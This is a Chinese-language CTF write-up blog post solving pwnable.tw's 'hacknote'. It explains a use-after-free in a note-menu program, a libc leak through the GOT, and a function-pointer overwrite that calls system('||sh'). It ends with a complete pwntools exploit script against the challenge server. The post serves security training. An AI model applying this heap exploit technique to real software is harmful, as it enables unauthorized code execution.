---
title: hacknote
date: 2018-04-20 08:37:40
tags: [CTF, PWN]
categories: PWN练习
---
# hacknote wp  -- 白板uaf漏洞利用
这道题是pwnable.tw上的一道200分的选单程序，题目给了你程序和libc文件。一般来这种都是根据功能分为好几个函数，我们需要将每一个函数中的逻辑搞清楚，然后在此基础上找到程序的漏洞.当然直接看的话可能会有难度，我们可以通过先随意构造输入使程序崩溃然后再用调试器去分析程序的处理，得到漏洞所在。
<!--more-->
打开ida开始分析程序发现逻辑是这样的：
首先有一个开始界面显示选项，功能是输出用户选项
```
  puts("----------------------");
  puts("       HackNote       ");
  puts("----------------------");
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
  puts("----------------------");
  return printf("Your choice :");
```
然后输出之后是一个read操作从标准输入获取用户输入,之后就是四个主要函数，我把它们分别定义为add，delete，print以及exit，  
![add函数](./img/add.png)  
![delete函数](./img/delete.png)   
![print函数](./img/print.png)  
根据经验，这是道堆题，所以可以把重心放在add和delete函数中，整理一下后发现逻辑是这样的:首先add函数中先malloc一个8个字节的空间，前四个字节用来存储print函数的地址，之后程序会根据用户输入的'note size'给content分配堆空间，然后将分配好的content堆地址存放到最初分配的8个字节的后四个字节，这之后程序获取用户输入的content内容存放到分配的'notesize'大小的堆空间中;delete函数中根据用户输入free掉note结构，但是这里并没有note中的指针设置为null，所以这里可以通过设置迷途指针触发UAF漏洞。  
具体利用思路如下：  
首先add两次，notesize只要不设置成8bytes就好，然后分别delete，这样bin中就会多出两个指向8bytes堆空间的指针，这时再add第三个note，并设置内容大小为8bytes，根据fastbin的LIFO的原则,note1的前8个字节存放note2的指针信息，note3的前8个字节存放新的内容，
```
(*ptr[v1])(ptr[v1]);
```
由于print函数中有一个执行note前四个字节指向函数的操作，只要改写了note的前8个字节，就能触发任意地址读和任意命令执行漏洞。  
![构造](./构造.png)  
需要注意的是这里之前add的两次设置的notesize不能为8bytes，否则的话是无法利用的，因为根据fastbin的LIFO原则，后free掉的空间会先用来存储，而ida中我们可以看到是先free掉存放content的堆空间，然后再free掉note结构的8bytes空间，
![free过程](./free过程.png)  
这样的话之后的add 8bytes就无法改写note结构前8bytes了。这里放上图。 
![若分配8字节](./若分配8字节.png)  
既然能任意地址读，那我们可以先泄露libc中system函数的地址,之后再进行一次delete和add执行system指令。
还有要注意的就是由于后四个字节不够存放`/bin/sh`字符串，这里有个操作就是system('||sh')，`||sh`刚好占用4个字节。  
嗯呐大体就是这样了,可以说是一个白板的UAF,然而就算是白板我也是看wp才做出来的，呜哇我好菜，快来个dalao拯救我一下~    
综上，其实uaf漏洞归根结底是linux系统下堆内存管理机制的问题，但是如果代码写得不规范的话还是很容易引起漏洞的。  

```
#encoding=utf-8
from pwn import *
from pwnlib import *
exe='./hacknote'
#r=process('./hacknote')
r=remote('chall.pwnable.tw',10102)
#gdb.attach(r,'''b *0x8048a41''')
def add(len,content):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil('Note size :')
	r.sendline(str(len))
	r.recvuntil('Content :')
	r.sendline(content)

def delete(index):
	r.recvuntil('Your choice :')
	r.sendline('2')
	r.recvuntil('Index :')
	r.sendline(str(index))

def show(index):
	r.recvuntil('Your choice :')
	r.sendline('3')
	r.recvuntil('Index :')
	r.sendline(str(index))

def leak():
	libc=ELF('./libc_32.so.6')
	libc_read_addr=libc.symbols['free']
	libc_system_addr=libc.symbols['system']
	add(16,'deadbeef')
	add(16,'babycafe')
	delete(0)
	delete(1)
	pri_got_addr=0x804862b
	read_got_addr=0x0804A018
	add(8,p32(pri_got_addr)+p32(read_got_addr))	
	show(0)
	read_addr=u32(r.recv(4))
	system_addr=read_addr-libc_read_addr+libc_system_addr	
	return system_addr	

leak_system_addr=leak()
delete(2)
#delete(1)
#delete(0)                                  #you have no node in [0], you only have content pointer in 0
print hex(leak_system_addr)
add(8,p32(leak_system_addr)+'||sh')
show(0)
r.interactive()

```

